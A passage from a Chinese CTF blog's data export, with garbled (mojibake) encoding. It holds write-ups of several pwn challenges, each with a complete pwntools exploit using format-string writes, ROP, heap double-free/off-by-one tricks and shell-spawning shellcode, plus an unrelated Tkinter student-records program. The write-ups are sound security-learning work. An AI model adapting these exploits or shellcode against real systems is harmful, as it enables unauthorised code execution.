0x10ï¼Œå› ä¸ºè¿™é‡Œleaveä»¥åå¹¶æ²¡æœ‰ç«‹å³ret,è€Œæ˜¯lea esp, [ecx-4]ï¼Œè°ƒè¯•å‘ç°æ—¶æ˜¯add esp, 0x10ï¼Œæ‰€ä»¥ret_addr=0x408+0x10+4 exp from pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,29221) #p=process(&quot;./ACTF_2019_OneRepeater&quot;) context.log_level=&quot;debug&quot; context(log_level=&#39;debug&#39;,arch=&#39;i386&#39;,os=&#39;linux&#39;) offset=16 p.sendlineafter(&#39;Exit&#39;,&#39;1&#39;) p.recvline() addr = int(p.recv(8).strip(), 16) ret_addr=addr+0x418+4 print(&#39;addr&#39;+hex(addr)) &#39;&#39;&#39; payload=p32(ret_addr)+b&#39;%&#39;+str(addr%65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39; p.sendline(payload) p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;) p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;) payload=p32(ret_addr+2)+b&#39;%&#39;+str(addr//65536-4).encode()+b&#39;c&#39;+b&#39;%16$hn&#39; p.sendline(payload) &#39;&#39;&#39; payload=p32(ret_addr)+p32(ret_addr+2)+b&#39;%&#39;+str(addr%65536-8).encode()+b&#39;c&#39;+b&#39;%16$hn&#39;+b&#39;%&#39;+str(addr//65536-addr%65536).encode()+b&#39;c%17$hn&#39; p.sendline(payload) p.sendlineafter(&#39;3) Exit&#39;,&#39;2&#39;) p.sendlineafter(&#39;3) Exit&#39;,&#39;1&#39;) #gdb.attach(p) sleep(1) p.sendline(asm(shellcraft.sh())) p.sendlineafter(&#39;3) Exit&#39;,&#39;3&#39;) p.interactive()","categories":[],"tags":[]},{"title":"checkin","slug":"checkin","date":"2024-02-29T06:36:05.000Z","updated":"2024-02-29T07:26:23.812Z","comments":true,"path":"2024/02/29/checkin/","link":"","permalink":"http://example.com/2024/02/29/checkin/","excerpt":"","text":"æŒºæœ‰æ„æ€çš„ä¸€é“æ ˆè¿ç§» s1æ˜¯å…¨å±€å˜é‡ï¼Œè¿™é‡Œå†™ropæ³„éœ²gotè¡¨åœ°å€ ä¸ºäº†å†ä¸€æ¬¡æ‰§è¡Œç¨‹åºï¼Œropåé¢æ¥çš„ä¸æ˜¯puts_plt è€Œæ˜¯è°ƒç”¨putså‡½æ•°çš„åœ°å€ï¼Œæ—¢èƒ½æ³„éœ²gotè¡¨åœ°å€ï¼Œåˆèƒ½å†æ‰§è¡Œä¸€æ¬¡ç¨‹åºã€‚ bufåªèƒ½æº¢å‡ºåˆ°rbpï¼Œä½†æ˜¯æœ‰ä¸¤æ¬¡leaveï¼Œä¸€ä¸ªæ˜¯sub_4018C7å‡½æ•°é‡Œçš„ ä¸Šä¸€ä¸ªå‡½æ•°ç»“æŸååˆ°sub_401876å‡½æ•°é‡Œçš„ï¼Œåˆšå¥½èƒ½æ‰§è¡Œä¸¤æ¬¡leaveã€‚ ä¸è¿‡è¿™é‡Œ(unsigned int)sub_401974(buf)å±å®ä¸å¤ªæ‡‚ï¼Œå¤ªæŠ½è±¡äº†ï¼Œä¹Ÿä¸çŸ¥é“å®ƒå…·ä½“æ˜¯æ€ä¹ˆæ£€æŸ¥çš„ä¸¤æ¬¡çš„payloadä¸å¤ªä¸€æ ·ã€‚payload1payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;+p64(0)*3+p64(bss) p.sendafter(&#39;Pass&#39;,payload2) payload2payload1=b&#39;admin\\x00\\x00\\x00&#39;*3+p64(one_gadget) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;*4+p64(bss+0x10) p.sendafter(&#39;Pass&#39;,payload2) expfrom pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,25691) #p=process(&quot;./login_pro&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc.So.6&#39;) bss=0x602400 pop_rdi=0x401ab3 puts_plt=0x4018b5 puts_got=0x602028 payload1=b&#39;admin\\x00\\x00\\x00&#39; payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;+p64(0)*3+p64(bss) p.sendafter(&#39;Pass&#39;,payload2) p.recvuntil(&#39;BaileGeBai\\n&#39;) puts_got=u64(p.recvuntil(&#39;\\n&#39;,drop=True).ljust(8,b&#39;\\x00&#39;)) print(hex(puts_got)) base=puts_got-libc.sym[&#39;puts&#39;] one=[0x45226,0x4527a,0xf03a4,0xf1247] one_gadget=base+one[1] #gdb.attach(p) sleep(1) payload1=b&#39;admin\\x00\\x00\\x00&#39;*3+p64(one_gadget) p.sendafter(&#39;&gt;&#39;,payload1) payload2=b&#39;admin\\x00\\x00\\x00&#39;*4+p64(bss+0x10) p.sendafter(&#39;Pass&#39;,payload2) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_es_1","slug":"ciscn-2019-es-1","date":"2024-01-21T16:08:54.000Z","updated":"2024-01-21T16:33:02.581Z","comments":true,"path":"2024/01/22/ciscn-2019-es-1/","link":"","permalink":"http://example.com/2024/01/22/ciscn-2019-es-1/","excerpt":"","text":"ciscn_2019_es_1checksecä¸€ä¸‹ï¼Œä¿æŠ¤å…¨å¼€ addshowå‡½æ•°ï¼Œå¯ä»¥è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ç„¶åç®—åç§» deleteå‡½æ•°ï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆç½®é›¶ï¼Œå­˜åœ¨UAFæ¼æ´ è¿‡ç¨‹è™½ç„¶ç†æ¸…ï¼Œä½†ä»ç„¶æœ‰ç‚¹æ‡µé€¼ã€‚å…ˆåˆ›ä¸‰ä¸ªå †add(0x410,&quot;AAAA&quot;) add(0x20,&quot;AAAA&quot;) add(0x20,&quot;bin/sh&quot;) delete(0) libcæ˜¯2.27ç‰ˆæœ¬ï¼Œå°±ä¼šæœ‰tachebinæœºåˆ¶ï¼Œfreeçš„å¤§å°å¤§äº0x400åˆ™å¯ä»¥ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼Œè€Œä»–çš„fdå’ŒbkæŒ‡é’ˆéƒ½ä¼šæŒ‡å‘main_arena+96è¿™ä¸ªåœ°å€ï¼Œshowå‡½æ•°æŠŠå®ƒè¾“å‡ºå‡ºæ¥å¹¶ç®—å‡ºåç§»é‡å¹¶ç®—å‡ºfree_hookçš„åœ°å€å’Œsystemå‡½æ•°çš„åœ°å€ã€‚ show(0) malloc_hook_addr = u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-96-0x10 base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;] free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;] system_addr = base_addr + libc.symbols[&#39;system&#39;] ç„¶åç”¨double freeï¼Œfreeä¸¤æ¬¡å †2ï¼Œç„¶åå †2çš„å¦‚ä¸‹ï¼Œä»¥åŠbin binæŒ‡é’ˆé“¾0x000055ac61f846c0è¿™ä¸ªåœ°å€è®°å½•äº†å®ƒæœ¬èº«è¿™é‡Œä¹Ÿè®¸æ˜¯tachebinçš„æœºåˆ¶ï¼Œå†æ¬¡mallocæ—¶ï¼Œä¼šå…ˆåˆ›å»ºä¸€ä¸ªå †è®°å½•ä¸‹ä¸€ä¸ªå †çš„åœ°å€ï¼Œè€Œä¸‹ä¸€ä¸ªå †æ­£æ˜¯æˆ‘ä»¬addå‡½æ•°çš„è¿‡ç¨‹ï¼Œåœ¨0x000055ac61f846c0è¿™ä¸ªåœ°å€å†™å…¥çš„æ˜¯free_hookçš„åœ°å€ï¼Œä½†æ˜¯å®ƒä¾ç„¶è¿˜æ˜¯åœ¨biné“¾ä¸­çš„ï¼Œè¿™å°±å¾ˆä¸è§£ï¼Œæ˜æ˜å·²ç»è¢«ä½¿ç”¨äº†ï¼Œè¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free_hookï¼Œæˆ‘ä»¬å†malloc è¿™æ—¶biné“¾çš„æŒ‡é’ˆæŒ‡åˆ°äº†free_hookï¼Œæˆ‘ä»¬å†mallocä¸¤æ¬¡å°±èƒ½æŠŠfree_hookå‡½æ•°çš„åœ°å€å†…å®¹æ”¹æˆsystemå‡½æ•°çš„åœ°å€,è€Œéƒ½åŒaddå‡½æ•°ä¸€æ ·æ­£å¸¸mollcï¼Œå‚æ•°bin/shæ”¾åœ¨å †3 exp from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28022) p=process(&quot;./ciscn_2019_es_1&quot;) context.log_level=&quot;debug&quot; elf=ELF(&quot;./ciscn_2019_es_1&quot;) libc=ELF(&quot;./libc-2.27.so&quot;) def add(size,name): p.recvuntil(&quot;choice:&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;name&quot;) p.sendline(str(int(size))) p.recvuntil(&quot;name:&quot;) p.sendline(name) p.recvuntil(&quot;call&quot;) p.sendline(name) def show(dex): p.sendlineafter(&quot;choice:&quot;,&#39;2&#39;) p.sendlineafter(&quot;index:&quot;,str(dex)) def delete(dex): p.sendlineafter(&quot;choice:&quot;,&#39;3&#39;) p.sendlineafter(&quot;index:\\n&quot;,str(dex)) add(0x410,&quot;AAAA&quot;) add(0x20,&quot;AAAA&quot;) add(0x20,&quot;bin/sh&quot;) delete(0) show(0) malloc_hook_addr = u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-96-0x10 base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;] free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;] system_addr = base_addr + libc.symbols[&#39;system&#39;] delete(1) delete(1) gdb.attach(p) sleep(1) add(0x20,p64(free_hook)) add(0x20,&#39;MMMM&#39;) add(0x20,p64(system_addr)) delete(2) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"lctf2016_pwn200","slug":"lctf2016_pwn200","date":"2024-01-14T12:22:41.000Z","updated":"2024-01-14T14:26:16.834Z","comments":true,"path":"2024/01/14/lctf2016_pwn200/","link":"","permalink":"http://example.com/2024/01/14/lctf2016_pwn200/","excerpt":"","text":"lctf2016_pwn200ä¸€é“æœ‰ç‚¹éš¾çš„å †é¢˜è¿™æ˜¯ä¸»å‡½æ•°çš„ç»“æ„ï¼Œå½“æˆ‘ä»¬è¾“å…¥æ»¡0x40æ—¶èƒ½å¤ŸæŠŠä¸»å‡½æ•°çš„ebpçš„åœ°å€æ³„éœ²å‡ºæ¥ ä¸‹é¢å°açš„æœ«å°¾çš„rbpå¯„å­˜å™¨å­˜ç€ä¸»å‡½æ•°çš„rbp åé¢è¿˜è°ƒç”¨äº†ä¸¤ä¸ªå‡½æ•°ï¼Œè¯´æ˜è¿™ä¸¤ä¸ªå‡½æ•°çš„æ ˆå¸§ç¦»å¾—ä¸è¿œï¼Œè€Œè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ„é€ æˆ‘ä»¬çš„fakechunk,è¿˜æœ‰æˆ‘ä»¬çš„shellcode shellcodeç¬¬ä¸€ä¸ªå¾—æ˜¯â€™\\x00â€™é˜²æ­¢å¤åˆ¶è¿‡å»ï¼Œé€ æˆå½±å“ç”³è¯·å¾—åˆ°å¾—å †çš„åœ°å€å’Œç»™è¿‡å»çš„ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯æ„é€ çš„æ ˆçš„ç»“æ„ ç„¶åptræŒ‡é’ˆçš„å€¼è¢«è¦†ç›–æˆæ ˆä¸Šçš„ï¼Œç­‰æˆ‘ä»¬freeå†mallocçš„æ—¶å€™å°±èƒ½ç”³è¯·åˆ°è¿™ï¼Œä½†æ˜¯å¤§å°å¾—æ˜¯0x30ï¼Œå› ä¸ºæˆ‘ä»¬æ„é€ çš„fakechunkçš„å¤§å°æ˜¯0x40çš„å¤§å°ï¼Œè¿™æ ·æ‰èƒ½mallocåˆ°æˆ‘ä»¬çš„æ ˆä¸Šï¼Œä»è€Œè¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œè€Œè¿”å›åœ°å€å¾—å†™æˆshellcodeå¼€å§‹çš„åœ°å€ã€‚shellcodeçš„ç»“æ„åº”è¯¥å†™å‡ºè¿™æ ·çš„ç»“æ„ã€‚ payload=3*p64(0)+p64(rbp-0xc0+1) å†æ¬¡ç”³è¯·è¦†ç›–æ‰è¿”å›åœ°å€ï¼Œæœ€åç¨‹åºè¿”å›çš„æ—¶å€™ä¼šæ‰§è¡Œshellcodefrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28868) p=process(&quot;./pwn200&quot;) context.log_level=&quot;debug&quot; payload=&#39;a&#39;*0x30 p.sendafter(&#39;u?&#39;,payload) p.recvuntil(&#39;a&#39;*0x30) rbp=u64(p.recv(6).ljust(8,&#39;\\x00&#39;)) print(hex(rbp)) shellcode=&quot;\\x00\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e&quot; shellcode+= &quot;\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f&quot; shellcode += &quot;\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; payload=(shellcode+2*p64(0)+p64(0X41)).ljust(0x38,&#39;\\x00&#39;) #gouzhao fakebchunk payload+=p64(rbp-0x90) p.sendlineafter(&#39;id ~~?&#39;,&#39;31&#39;) print(hex(rbp-0x90)) p.sendlineafter(&#39;money~&#39;,payload) p.sendlineafter(&#39;choice : &#39;,&#39;2&#39;) #p.recvuntil(&#39;\\n&#39;) gdb.attach(p) sleep(1) p.sendlineafter(&#39;choice : &#39;,&#39;1&#39;) p.sendlineafter(&#39;long?&#39;,&#39;48&#39;) payload=3*p64(0)+p64(rbp-0xc0+1) p.sendlineafter(&#39;money : &#39;,payload) p.sendlineafter(&#39;choice : &#39;,&#39;3&#39;) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"pythonè¯¾è®¾","slug":"pythonè¯¾è®¾","date":"2023-12-25T14:49:46.000Z","updated":"2023-12-25T14:54:02.315Z","comments":true,"path":"2023/12/25/pythonè¯¾è®¾/","link":"","permalink":"http://example.com/2023/12/25/python%E8%AF%BE%E8%AE%BE/","excerpt":"","text":"import tkinter as tk from tkinter import messagebox, simpledialog import json import re import os STUDENT_FILE = &#39;students.json&#39; def load_students(): if not os.path.exists(STUDENT_FILE): return [] with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file: return json.load(file) def save_students(students): with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file: json.dump(students, file, ensure_ascii=False, indent=2) def show_students(students): sorted_students = sorted(students, key=lambda x: x[&#39;id&#39;]) # æŒ‰å­¦å·æ’åº students_text = &quot;&quot; for student in sorted_students: students_text += f&quot;å­¦å·: &#123;student[&#39;id&#39;]&#125;\\n&quot; students_text += f&quot;å§“å: &#123;student[&#39;name&#39;]&#125;\\n&quot; students_text += f&quot;å¹´é¾„: &#123;student[&#39;age&#39;]&#125;\\n&quot; students_text += f&quot;æ€§åˆ«: &#123;student[&#39;gender&#39;]&#125;\\n\\n&quot; return students_text def validate_id(student_id): return bool(student_id.strip()) def add_student(students): dialog = tk.Toplevel() dialog.title(&quot;æ·»åŠ å­¦ç”Ÿä¿¡æ¯&quot;) dialog.geometry(&quot;250x200+900+400&quot;) tk.Label(dialog, text=&quot;å­¦å·ï¼š&quot;).grid(row=0, column=0, padx=10, pady=5) id_var = tk.StringVar() tk.Entry(dialog, textvariable=id_var).grid(row=0, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;å§“åï¼š&quot;).grid(row=1, column=0, padx=10, pady=5) name_var = tk.StringVar() tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;å¹´é¾„ï¼š&quot;).grid(row=2, column=0, padx=10, pady=5) age_var = tk.StringVar() tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;æ€§åˆ«ï¼š&quot;).grid(row=3, column=0, padx=10, pady=5) gender_var = tk.StringVar() gender_var.set(&quot;ç”·&quot;) gender_menu = tk.OptionMenu(dialog, gender_var, &quot;ç”·&quot;, &quot;å¥³&quot;) gender_menu.grid(row=3, column=1, padx=10, pady=5) def add_student_action(): student_info = &#123; &#39;id&#39;: id_var.get(), &#39;name&#39;: name_var.get(), &#39;age&#39;: age_var.get(), &#39;gender&#39;: gender_var.get() &#125; if not student_info[&#39;id&#39;] or not validate_id(student_info[&#39;id&#39;]): messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·æ ¼å¼é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;) return if any(student[&#39;id&#39;] == student_info[&#39;id&#39;] for student in students): messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·å·²å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;) return students.append(student_info) messagebox.showinfo(&quot;æˆåŠŸ&quot;, &quot;å­¦ç”Ÿä¿¡æ¯æ·»åŠ æˆåŠŸï¼&quot;) dialog.destroy() add_button = tk.Button(dialog, text=&quot;æ·»åŠ &quot;, command=add_student_action) add_button.grid(row=4, columnspan=2, pady=10) def edit_student(students): student_id = simpledialog.askstring(&quot;è¾“å…¥&quot;, &quot;è¯·è¾“å…¥è¦ç¼–è¾‘çš„å­¦å·ï¼š&quot;) if not student_id or not validate_id(student_id): messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·æ ¼å¼é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;) return student = next((s for s in students if s[&#39;id&#39;] == student_id), None) if student: messagebox.showinfo(&quot;ä¿¡æ¯&quot;, f&quot;å­¦å·: &#123;student[&#39;id&#39;]&#125;\\nå§“å: &#123;student[&#39;name&#39;]&#125;\\nå¹´é¾„: &#123;student[&#39;age&#39;]&#125;\\næ€§åˆ«: &#123;student[&#39;gender&#39;]&#125;&quot;) dialog = tk.Toplevel() dialog.title(&quot;ç¼–è¾‘å­¦ç”Ÿä¿¡æ¯&quot;) dialog.geometry(&quot;250x200+900+400&quot;) tk.Label(dialog, text=&quot;å§“åï¼š&quot;).grid(row=1, column=0, padx=10, pady=5) name_var = tk.StringVar(value=student[&#39;name&#39;]) tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;å¹´é¾„ï¼š&quot;).grid(row=2, column=0, padx=10, pady=5) age_var = tk.StringVar(value=str(student[&#39;age&#39;])) tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5) tk.Label(dialog, text=&quot;æ€§åˆ«ï¼š&quot;).grid(row=3, column=0, padx=10, pady=5) gender_var = tk.StringVar(value=student[&#39;gender&#39;]) gender_menu = tk.OptionMenu(dialog, gender_var, &quot;ç”·&quot;, &quot;å¥³&quot;) gender_menu.grid(row=3, column=1, padx=10, pady=5) def edit_student_action(): student[&#39;name&#39;] = name_var.get() student[&#39;age&#39;] = int(age_var.get()) student[&#39;gender&#39;] = gender_var.get() messagebox.showinfo(&quot;æˆåŠŸ&quot;, &quot;å­¦ç”Ÿä¿¡æ¯ç¼–è¾‘æˆåŠŸï¼&quot;) dialog.destroy() edit_button = tk.Button(dialog, text=&quot;ç¼–è¾‘&quot;, command=edit_student_action) edit_button.grid(row=4, columnspan=2, pady=10) else: messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;æœªæ‰¾åˆ°è¯¥å­¦ç”Ÿä¿¡æ¯ã€‚&quot;) def delete_student(students): student_id = simpledialog.askstring(&quot;è¾“å…¥&quot;, &quot;è¯·è¾“å…¥è¦åˆ é™¤çš„å­¦å·ï¼š&quot;) if not student_id or not validate_id(student_id): messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;å­¦å·æ ¼å¼é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ã€‚&quot;) return student = next((s for s in students if s[&#39;id&#39;] == student_id), None) if student: students.remove(student) messagebox.showinfo(&quot;æˆåŠŸ&quot;, &quot;å­¦ç”Ÿä¿¡æ¯åˆ é™¤æˆåŠŸï¼&quot;) else: messagebox.showerror(&quot;é”™è¯¯&quot;, &quot;æœªæ‰¾åˆ°è¯¥å­¦ç”Ÿä¿¡æ¯ã€‚&quot;) def main(): root = tk.Tk() root.title(&quot;å­¦ç”Ÿä¿¡æ¯ç®¡ç†ç³»ç»Ÿ&quot;) students = load_students() window_width = 800 window_height = 500 screen_width = root.winfo_screenwidth() screen_height = root.winfo_screenheight() x_position = (screen_width - window_width) // 2 y_position = (screen_height - window_height) // 2 root.geometry(f&quot;&#123;window_width&#125;x&#123;window_height&#125;+&#123;x_position&#125;+&#123;y_position&#125;&quot;) def show_students_command(): students_text = show_students(students) messagebox.showinfo(&quot;å­¦ç”Ÿä¿¡æ¯&quot;, students_text) def add_student_command(): add_student(students) def delete_student_command(): delete_student(students) def edit_student_command(): edit_student(students) def save_and_exit(): save_students(students) root.destroy() show_students_button = tk.Button(root, text=&quot;æ˜¾ç¤ºæ‰€æœ‰å­¦ç”Ÿä¿¡æ¯&quot;, command=show_students_command) show_students_button.pack() add_student_button = tk.Button(root, text=&quot;æ·»åŠ å­¦ç”Ÿä¿¡æ¯&quot;, command=add_student_command) add_student_button.pack() delete_student_button = tk.Button(root, text=&quot;åˆ é™¤å­¦ç”Ÿä¿¡æ¯&quot;, command=delete_student_command) delete_student_button.pack() edit_student_button = tk.Button(root, text=&quot;ç¼–è¾‘å­¦ç”Ÿä¿¡æ¯&quot;, command=edit_student_command) edit_student_button.pack() exit_button = tk.Button(root, text=&quot;ä¿å­˜å¹¶é€€å‡º&quot;, command=save_and_exit) exit_button.pack() root.mainloop() if __name__ == &quot;__main__&quot;: main()","categories":[],"tags":[]},{"title":"sctf2019_easy_heap","slug":"sctf2019-easy-heap","date":"2023-12-06T13:15:49.000Z","updated":"2023-12-09T14:27:35.188Z","comments":true,"path":"2023/12/06/sctf2019-easy-heap/","link":"","permalink":"http://example.com/2023/12/06/sctf2019-easy-heap/","excerpt":"","text":"ä¾‹è¡Œæ£€æŸ¥ï¼Œä¿æŠ¤å…¨å¼€è°ƒç”¨äº†mmapå‡½æ•°ï¼ŒæŠŠ0xFFFFFFF000çš„åœ°å€æ˜ å°„åˆ°å†…å­˜ä¸­æŸä¸ªåœ°å€ï¼Œå¹¶æ‰“å°å‡ºæ¥ï¼Œå¾ˆæ˜æ˜¾è¿™é“é¢˜å¾—ç”¨shellcodeæ¥åšï¼Œè¿™ä¸ªåœ°å€å¯è¯»å¯å†™å¯è¿è¡Œï¼Œåé¢è¦ç”¨ addå‡½æ•°,ä¼šæ‰“å°å‡ºå †çš„åœ°å€ fullå‡½æ•°ï¼Œèƒ½è¾“å…¥å†…å®¹åˆ°å †ä¸Š æœ€åä¼šå¢æ·»ä¸€ä¸ªâ€™\\x00â€™,å­˜åœ¨off by one æ¼æ´ freeå‡½æ•°ï¼Œæ²¡ä»€ä¹ˆæ¼æ´ å…ˆæ¥æ”¶mmapæ˜ å°„çš„åœ°å€p.recvuntil(b&#39;Mmap: &#39;) vmap = p.recvline().strip() vmap = int(vmap, 16) print(&#39;vmap=&gt;&#39;+hex(vmap)) åšoff-by-oneè¿™ç§é¢˜çš„è¯ï¼Œæœ‰ä¸ªæŠ€å·§ï¼Œä¸€èˆ¬éƒ½æ˜¯å…ˆç”³è¯·å››ä¸ªå †add(0x410) #0 add(0x68) #1 add(0x4f0) #2 add(0x68) #3 ç„¶åé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œç„¶åå¡«å……ç¬¬ä¸€ä¸ªå †ï¼Œåˆ©ç”¨sub_E2Då‡½æ•°çš„è¾“å…¥æŠŠå †2çš„sizeä½æ”¹ä¸º0ï¼Œç„¶åé‡Šæ”¾å †2è¿›è¡Œunlinkæ“ä½œï¼Œç„¶åå †1ä¼šè¢«å¤¹åœ¨ä¸­é—´free(0) payload=p64(0)*12+p64(0x490) fill(1,payload) é‡Šæ”¾å †2ï¼Œä¼šè¿›è¡Œunlink å†ç”³è¯·ä¸€æ¬¡0x410å’Œ0x68å¤§å°çš„å †ï¼Œå †2ä¼šå’Œå †1çš„ä½ç½®é‡åˆ å†deleteå‡ æ¬¡ï¼Œç›¸å½“äºdouble freeäº†å †2delete(3) delete(1) #1=&gt;#3 delete(2) #2(1)=&gt;1 æ¥ä¸‹æ¥æ”¹biné“¾æŒ‡é’ˆæˆæ”¹æˆvmapçš„ï¼Œå†™ä¸Šshellcode ä¸Šé¢çš„è¯å †2æ˜¯æ²¡æœ‰freeçš„ï¼Œç„¶åç”¨ä¸Šé¢çš„æ–¹å¼å†unlinkä¸€æ¬¡ï¼Œå†add0x410å¤§å°çš„å †ï¼Œä¼šåœ¨å †2çš„fdæŒ‡é’ˆä¸Šæœ‰main_arena+96çš„åœ°å€ã€‚fill(1,payload) delete(1) delete(4) #unlink add(0x410) # 0 fillå †2ä¸€ä¸ªå­—èŠ‚ï¼Œå°†å…¶æ”¹ä¸º0x30ï¼Œæ—¢æ˜¯mallloc_hookçš„åœ°å€ å†malloc0x68ä¸¤æ¬¡ï¼Œç¬¬äºŒæ¬¡å†™ä¸Švmapçš„åœ°å€,å†ä»»æ„ç”³è¯·ä¸€æ¬¡å †å³å¯ææƒadd(0x68) #1 fill(1,p64(vmap)) # 4 add(0x68) #4 fill(4,p64(vmap)) add(0x20) expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28038) p=process(&quot;./sctf2019_easy_heap&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) context.arch=&#39;amd64&#39; #context=arch(&#39;amd64&#39;) def add(size): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) def fill(index,content): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index:&#39;,str(index)) p.sendlineafter(&#39;Content:&#39;,content) def delete(index): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.recvuntil(b&#39;Mmap: &#39;) vmap = p.recvline().strip() vmap = int(vmap, 16) print(&#39;vmap=&gt;&#39;+hex(vmap)) add(0x410) #0 add(0x68) #1 add(0x4f0) #2 add(0x68) #3 payload=p64(0)*12+p64(0x490) delete(0) fill(1,payload) delete(2) add(0x410) #0 add(0x68) #2 lead to chunk1 delete(3) delete(1) #1=&gt;3 delete(2) #1=&gt;1 in the similar case we use by UAF,but it is not. add(0x68) #1 fill(1,p64(vmap)) add(0x68) #2 add(0x68) #3 shellcode=asm(shellcraft.sh()) fill(3,shellcode) add(0x4f0) #4 delete(0) #free 0x410 fill(1,payload) delete(1) delete(4) #unlink add(0x410) # 0 gdb.attach(p) sleep(1) pause() fill(2,&#39;\\x30&#39;) add(0x68) #1 fill(1,p64(vmap)) # 4 add(0x68) #4 fill(4,p64(vmap)) add(0x20) p.interactive()","categories":[],"tags":[]},{"title":"metasequoia_2020_samsara","slug":"metasequoia-2020-samsara","date":"2023-12-03T08:02:58.000Z","updated":"2023-12-03T09:25:48.720Z","comments":true,"path":"2023/12/03/metasequoia-2020-samsara/","link":"","permalink":"http://example.com/2023/12/03/metasequoia-2020-samsara/","excerpt":"","text":"ä¿æŠ¤å…¨å¼€ï¼Œå°±ä¸æ”¾äº†ç¨‹åºæŒºç®€å•çš„ï¼Œèœå•ç›´æ¥æ”¾å‡ºæ¥äº†ï¼Œå­˜åœ¨double freeæ¼æ´ï¼Œåªéœ€è¦è®©v8=0xdeadbeefå°±èƒ½æ‹¿åˆ°flag å…ˆdouble free,ç„¶åç”¨case4æ‰“å°å‡ºv7çš„åœ°å€ï¼Œåœ¨æ ˆä¸Šv8çš„åœ°å€ç­‰äºv7+0x8,double freeæ”¹åœ°å€çš„æ—¶å€™æ”¹åˆ°v7-0x8,ç„¶åv7çš„å€¼å¾—æ˜¯0x20ï¼Œæ„é€ fakechunkï¼Œç„¶åmallocçš„æ—¶å€™åœ¨v7-0x8+0x10çš„åœ°æ–¹å†™ä¸Š0xdeadbeef å¼€å§‹çš„æ—¶å€™å¾—å¤šç”³è¯·ä¸€ä¸ªå †å †3ï¼Œå…¶ä»–å¸ˆå‚…è¯´é˜²æ­¢free æ‰çš„ä¸¤ä¸ªchunkå’Œtop chunkåˆå¹¶ï¼Œè„šæœ¬è·‘çš„è¯æ²¡é€ï¼Œä½†ä»¥åè¿˜æ˜¯å¾—æ³¨æ„expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,28766) p=process(&quot;./metasequoia_2020_samsara&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) def add(): p.sendlineafter(&#39;choice &gt; &#39;,&#39;1&#39;) def free(index): p.sendlineafter(&#39;choice &gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index&#39;,str(index)) def full(index,content): p.sendlineafter(&#39;choice &gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index&#39;,str(index)) p.sendlineafter(&#39;Ingredient:&#39;,content) def show(): p.sendlineafter(&#39;choice &gt; &#39;,&#39;4&#39;) def move(content): p.sendlineafter(&#39;choice &gt; 